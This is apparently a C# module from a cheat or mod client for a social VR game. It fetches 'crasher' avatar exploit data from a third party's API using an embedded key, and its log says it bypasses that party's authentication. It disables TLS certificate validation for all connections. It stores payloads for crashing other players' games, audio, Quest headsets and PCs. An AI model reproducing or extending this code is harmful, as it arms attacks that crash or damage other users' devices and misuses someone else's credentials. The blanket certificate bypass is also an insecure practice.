using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Trinity.SDK;
using Trinity.SDK.ButtonAPI;

namespace Trinity.Module.Exploit.Avatar_Crash
{
    class FuckJosh : BaseModule
    {
        public static string Response { get; set; }
        public static string[] ResponseSplit { get; set; }
        public FuckJosh() : base("Update ID's", "Grabs Josh's New Crasher Avitars From There API", Main.Instance.Avatarexploitbutton, QMButtonIcons.LoadSpriteFromFile(Serpent.rocketPath), false, false)
        { } 
        public override void OnEnable()
        {
            GetCrashers();
        }
        public void GetCrashers()
        {
            using (var wc = new WebClient())
            {
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; }; // SSL Windows 10 Issue Fix
                Response = wc.DownloadString("https://api.outerspace.store/auth/api/serverinfo.php?key=YJGJPS-HRGZRNIF-WBZUZO");
                ResponseSplit = Response.Split('|');
                if (ResponseSplit[0].Contains("True"))
                {
                    LogHandler.Log(LogHandler.Colors.Yellow, $"[CRASHERS GRABBED] Bypassed Area51 Auth & Grabbed Crasher Exploits! \n Currupt Asset: {Misc.Base64Decode(ResponseSplit[3])} \n Game Closer: {Misc.Base64Decode(ResponseSplit[4])} \n Audio Crasher: {Misc.Base64Decode(ResponseSplit[5])} \n Corrupted PC: {Misc.Base64Decode(ResponseSplit[6])} \n Quest Crasher: {Misc.Base64Decode(ResponseSplit[7])} \n Void Bypasser: {Misc.Base64Decode(ResponseSplit[8])} \n", false, false);
                    SDK.Security.SecurityCheck.ExploitData.CorruptBundleData = Misc.Base64Decode(ResponseSplit[3]);
                    SDK.Security.SecurityCheck.ExploitData.GameCloseData = Misc.Base64Decode(ResponseSplit[4]);
                    SDK.Security.SecurityCheck.ExploitData.AudioCrashData = Misc.Base64Decode(ResponseSplit[5]);
                    SDK.Security.SecurityCheck.ExploitData.CorruptPCData = Misc.Base64Decode(ResponseSplit[6]);
                    SDK.Security.SecurityCheck.ExploitData.QuestCloseData = Misc.Base64Decode(ResponseSplit[7]);
                    SDK.Security.SecurityCheck.ExploitData.VoidBypassData = Misc.Base64Decode(ResponseSplit[8]);
                    SDK.Security.SecurityCheck.ExploitData.CloseConnection();
                }
            }
        }
    }
}
